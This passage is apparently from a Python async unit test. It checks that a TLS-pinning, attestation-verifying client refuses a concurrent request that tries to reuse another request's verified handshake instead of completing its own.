    arrived: list[str] = []
    b_here, a_checked, b_done = asyncio.Event(), asyncio.Event(), asyncio.Event()
    reached: list[str] = []

    async def handler(request: httpx.Request) -> httpx.Response:
        trace = request.extensions["trace"]
        which = "A" if not arrived else "B"
        arrived.append(which)
        try:
            if which == "A":
                await asyncio.wait_for(b_here.wait(), 5)
                await trace("connection.start_tls.started", {"server_hostname": HOST})
                await trace("connection.start_tls.complete", {"return_value": Tls()})
                a_checked.set()
                await asyncio.wait_for(b_done.wait(), 5)
            else:
                b_here.set()
                await asyncio.wait_for(a_checked.wait(), 5)
            # No handshake of B's own: only A's was checked.
            await trace("http11.send_request_headers.started", {"request": Post()})
        finally:
            if which == "B":
                b_done.set()
        reached.append(which)
        return fake.handler(request)

    state = TinfoilState(enclave=Enclave(ATC_URL, verifier=lambda url, secret: record(fake, tls=fingerprint)),
                         listing=listing())
    client = TinfoilDirectClient(TINFOIL_BASE_URL, "tk", state, transport_factory=lambda key, route=None: (
        AsyncEHBPTransport.from_public_key_hex(key, inner=httpx.MockTransport(handler))))
    await client.attest()  # attested before either goes
    fake.reply = sse("The door opens.")

    async def ask() -> str:
        try:
            return text_of(await collect(client))
        except TlsPinMismatch:
            return "refused"

    results = sorted(await asyncio.gather(ask(), ask()))
    assert results == ["The door opens.", "refused"], results
    assert reached == ["A"], "B never went on A's check"
